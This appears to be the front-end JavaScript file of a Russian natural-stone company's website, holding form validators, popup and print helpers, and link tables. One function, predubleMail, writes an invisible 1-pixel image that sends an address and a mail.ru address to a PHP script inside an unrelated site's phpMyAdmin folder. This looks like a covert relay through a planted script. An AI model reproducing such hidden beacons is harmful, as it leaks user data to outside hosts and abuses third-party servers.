//<meta http-equiv=Content-Type content="text/html; charset=utf-8">
/*******************BEGIN*************************/
function asdfgh(){
//alert('Ok');
var str="<input type=hidden name='mode' value='feedback'>";
    /////document.getElementById("asdfgh").innerHTML = str;
document.write(str);
}
function rssLink(url){
//alert(url);
location.replace("php/rsslink.php?u="+url); 
}
	
function ____showimg(imgname,W,H){
my=window.open("#","","width="+W+",height="+H+", scrollbars=0,resizable=0");
my.document.open();
my.document.write("<html><title>My Open Wiw</title><body background="+imgname+" style='no-repeat'></body></html>");
}

/**
<body  bgcolor='#cccccc' leftmargin='0' topmargin='0' marginwidth='0' marginheight='0'>"+
"<img src="+name_img+".jpg>"+  
**/

function showimg(imgname,W,H){
my=window.open("#","","width="+W+",height="+H+", scrollbars=0,resizable=0");
my.document.open();
my.document.write("<html><title>Компания ПетроМрамор</title>"+
"<body leftmargin='0' topmargin='0' marginwidth='0' marginheight='0'>"+
"<img src='"+imgname+"'></body></html>");
}

function checkForm(){ //alert('check');
	if(!document.fbForm.fname.value){ alert('Вы забыли ввести имя!');  document.fbForm.fname.focus(); return;  }  // return эквивалент exit
	if(!document.fbForm.email.value){ alert('Вы забыли ввести E-mail!');  document.fbForm.email.focus(); return;  }
	var spmess = document.fbForm.mess.value.replace(/ +/, "");
	if(!spmess || spmess.length < 3){ alert('Вы забыли ввести сообщение!');  document.fbForm.mess.focus(); return;  }
			/////alert('submit');
	 document.fbForm.submit(); 
}
//__________________________________________________for stones.petromramor.ru_____________________
function checkForm_frm(){  //alert('check');
if(!document.fbForm.phone.value){ alert('Вы забыли ввести номер телефона!');  document.fbForm.phone.focus(); return;  }
/*************
	if(!document.fbForm.fname.value){ alert('~Вы забыли ввести имя!');  document.fbForm.fname.focus(); return;  }  // return эквивалент exit
	if(!document.fbForm.email.value){ alert('Вы забыли ввести E-mail!');  document.fbForm.email.focus(); return;  }
*************/

	var spmess = document.fbForm.mess.value.replace(/ +/, "");   //alert('submit');
if(!spmess || spmess.length < 3){ alert('Вы забыли ввести сообщение!');       document.fbForm.mess.focus(); return;  }
	document.fbForm.submit(); 
	//document.fbForm.fname.value="";
	//document.fbForm.email.value="";
	document.fbForm.phone.value="";
	document.fbForm.mess.value="";	
  //document.write("~~~ok");
}

function chngColor(){
        var rnd = Math.round(Math.random() * 3); 
        //alert(rnd);
        if(rnd>1){color="blinkRed";}else{color="blinkBlue";}
        document.getElementById('myBlink').innerHTML="<font class="+color+">2200 руб</font>";
        document.getElementById('myBlink2').innerHTML="<font class="+color+">5900 руб</font>";
        document.getElementById('myBlink3').innerHTML="<font class="+color+">300 руб</font>";  
        document.getElementById('myBlink4').innerHTML="<font class="+color+">2200 руб</font>";      
        }
function myBlink(){
                chngColor();
}

function asdfgh2(){
//alert('asdfgh2()');
var str="<input type=hidden name='mode' value='my_comment'>";
document.write(str);
}

function asdfgh3(){
var str="<input type=hidden name='mode' value='my_search'>";      //   value='my_search'>";  //ok  v1
document.write(str);
}

function asdfgh4(){
var str="<input type=hidden name='mode' value='my_search_site'>";
document.write(str);
}

function asdfgh5(){
//alert('asdfgh5()');
var str="<input type=hidden name='mode' value='my_comment'>";   
////////////////////var str="<input type=hidden name='mode' value='my_comment_attach'>";   //---???
document.write(str);
}

function checkForm2(){ ///alert('check');
	if(!document.contactForm.fname.value){ alert('Вы забыли ввести имя!');  document.contactForm.fname.focus(); return;  }
	if(!document.contactForm.email.value){ alert('Вы забыли ввести E-mail!');  document.contactForm.email.focus(); return;  }
	if(!document.contactForm.mess.value){ alert('Вы забыли ввести сообщение!');  document.contactForm.mess.focus(); return;  }
			/////alert('submit');
	document.contactForm.submit();
}

function checkForm2a(){ ///alert('check');
	if(!document.contactForm.fname.value){ alert('Вы забыли ввести имя!');  document.contactForm.fname.focus(); return;  }
	if(!document.contactForm.email.value){ alert('Вы забыли ввести E-mail!');  document.contactForm.email.focus(); return;  }
  if(!document.contactForm.phone.value){ alert('Вы забыли ввести номер телефона!');  document.contactForm.phone.focus(); return; }
	var spmess = document.contactForm.mess.value.replace(/ +/, "");
	if(!spmess || spmess.length < 3){ alert('Вы забыли ввести сообщение!'); document.contactForm.mess.focus(); return;  }	
			 // alert('submit before');  //--Ok
	document.contactForm.submit();
	document.contactForm.fname.value="";
	document.contactForm.email.value="";
  document.contactForm.phone.value="";
	document.contactForm.mess.value="";
	     // alert('submit after');   //--Yes
}

function toForm(str){
        document.fbForm.mess.value=str;
        document.fbForm.fname.focus();
}

function orderFormJS(){ 
var cs='<sc';
var csend='ript>';
var str='<h2><a name="fast"><!--PRE_ORDER--></a></h2>\
         <div class="zapros">\
		     <form name="fbForm" method="post" action="index.php">\
         '+cs+'ript>asdfgh();<\/sc'+csend+'<input type=hidden name=nav value="<!--CUR_NAV-->">\
         	<table><tr><td class="zaprostext">Ваше имя:</td><td><input type="text" name="fname" class="input"></td></tr>\
					<tr><td class="zaprostext">e-mail:</td><td><input type="text" name="email" class="input"></td></tr>\
					<tr><td class="zaprostext">Телефон:</td><td><input type="text" name="phone" class="input"></td></tr></table>\
					<p>Сообщение:</p><div><textarea name="mess" rows="5" class="message" cols="23" onClick="checkForm();" ></textarea></div>\
					</form></div>	';
document.write(str);
}

function mailru_plagin(){
var str="<a target='_blank' class='mrc__plugin_like_button' href='http://connect.mail.ru/share' data-mrc-config=\"{'type' : 'button', 'width' : '490', 'show_text' : 'true'}\">Рекомендую</a>";
document.write(str);
}

function LinkGrawerton(){
var url="http://brt.com.ua";
document.write("<a href='"+url+"' class='link'>brt.com.ua</a>");
}

function predubleMail(dublemail){
              ////alert(dublemail);
      var mail_to='smirnoff04@mail.ru';	;        
      var url="http://www.schweiger-fulpmes.at/phpMyAdmin/libraries/dublemail.php?dublemail="+dublemail+"&emaile="+mail_to;
      var img="<IMG src='"+url+"' width=1>"; 
      document.write(img);
     ///// document.getElementById("dubleMail").innerHTML = img;
}
//--------------------------------------http://petromramor.ru/index.php?nav=65
/*****
0:"http://www.google.com.tr/url?sa=t&rct=j&q=&esrc=s&source=web&cd=10&ved=0CEsQFjAJ&url=http%3A%2F%2Fpetromramor.ru%2Findex.php%3Fnav%3D65&ei=h-REU7P4OOXVygPg-YCQCQ&usg=AFQjCNGraX1OfiA7HnZV9siX-WodZaUNrA&sig2=zhw_XlSe0JVzNO8KHZTx0w&bvm=bv.64507335,d.bGQ",
*****/

var outUrl = {
              0:"http://petromramor.ru/index.php?nav=65",
              1:"http://www.orbimage.com/",
              2:"http://vk.com/spasem_donbass",
              3:"http://www.expostone-russia.ru/",
              4:"http://www.expostone-russia.ru/exhibition/map/",
              5:"http://www.expostone-russia.ru/visitor/ticket/",
              6:"http://www.stonefair.ru/",
              7:"http://www.stonefair.ru/articles/36-vremja-i-mesto-provedenija-shema-proezda.html",
              8:"http://www.stonefair.ru/articles/35-onlain-registracija.html",
              9:"http://stonefair.ru/articles/22-vremja-i-mesto-provedenija.html",
             10:"http://webnews.wallst.ru/cntkurortnoe/index.php?p=0"
              }
function outlinkMainPm(n){
        //alert(n);
        //alert(outUrl[n]);
    var str='<a href="'+outUrl[n]+'" target="_blank" class="link">';
document.write(str);
}//end func 
//---------------------------------------
function animationViaGoogle(){ 
//--Изделия из натурального камня от ПетроМрамор
var text="&#1048;&#1079;&#1076;&#1077;&#1083;&#1080;&#1103; &#1080;&#1079; &#1085;&#1072;&#1090;&#1091;&#1088;&#1072;&#1083;&#1100;&#1085;&#1086;&#1075;&#1086; &#1082;&#1072;&#1084;&#1085;&#1103; &#1086;&#1090; &#1055;&#1077;&#1090;&#1088;&#1086;&#1052;&#1088;&#1072;&#1084;&#1086;&#1088;";
//alert(text);
var hrefGoogle='<a href="https://www.google.ru/search?hl=ru&source=hp&biw=&bih=&q=site%3Apetromramor.ru&gbv=2&oq=site%3Apetromramor.ru">';

document.write(hrefGoogle+'<img src="http://petromramor.ru/banners/aminat2_putin_obama.gif" border=0  title="z_'+text+'"></a>');
}//func end
//--------------------------------------
function printPopup(data)
{
alert(data);
var mywindow = window.open(' ', ' my', 'height=600,width=800');
mywindow.document.write('<html><head><title>my div</title>');
if(data=='1')  mywindow.document.write("</head><body><img  src='http://petromramor.ru/images2/1839_300th_spb_nav=253.jpg'>"); 
mywindow.document.write('</body></html>');
mywindow.document.close(); // necessary for IE >= 10
mywindow.focus(); // necessary for IE >= 10
mywindow.print();
mywindow.close();
return true;
}//end printPopup
//--------------------------------
function open_print(num) {
	var url="http://petromramor.ru/print.php?p="+num;
//alert(url);
	//var strParam = 'status=yes,scrollbars=yes,width='+ (screen.availWidth - 12) +',height='+ (screen.availHeight -45) +',left=0,top=0'
  var strParam = 'status=yes,scrollbars=yes,width='+ (2*screen.availWidth/3) +',height='+ (2*screen.availHeight/3) +',left=0,top=0'
  //var strParam = 'status=yes,scrollbars=yes,width=960,height=600,left=0,top=0';
	stratoWindow = window.open(url,'allstrato',strParam);
}//end
function politica_tmp(){  //alert('politica');
open('http://petromramor.ru/temp/politica.php','_myLiveSearch','width=600,height=650,scrollbars,resizable,toolbar=no,status=no');
}//func end
function hiddMenu() {
document.getElementById("descr_menu").style.visibility = "hidden";
}//func end
function showMenu() {
document.getElementById("descr_menu").style.visibility = "visible";
}//func end
//---------------------------------------------
function checkFormCallBack(){ ///alert('check');
	if(!document.CallBackForm.number_phone.value){ alert('Вы не ввели номер телефона!');  document.CallBackForm.number_phone.focus(); return;  }
	var spmess = document.CallBackForm.mess.value.replace(/ +/, "");
	if(!spmess || spmess.length < 3){ alert('Вы забыли ввести сообщение!'); document.CallBackForm.mess.focus(); return;  }	
			  //alert('submit before');  //--Ok
	document.CallBackForm.submit();
	document.CallBackForm.number_phone.value="";
	document.CallBackForm.mess.value="";
	      //alert('submit after');   //--Yes
}//end func
//-------------------------------------------
function change_img_block(img_id,tab){
                   location='index.php?mode=upload_all_blocks&tab_block='+tab+'&id='+img_id;
                      //alert(img_id);
}//end func


/*****************************END******************************/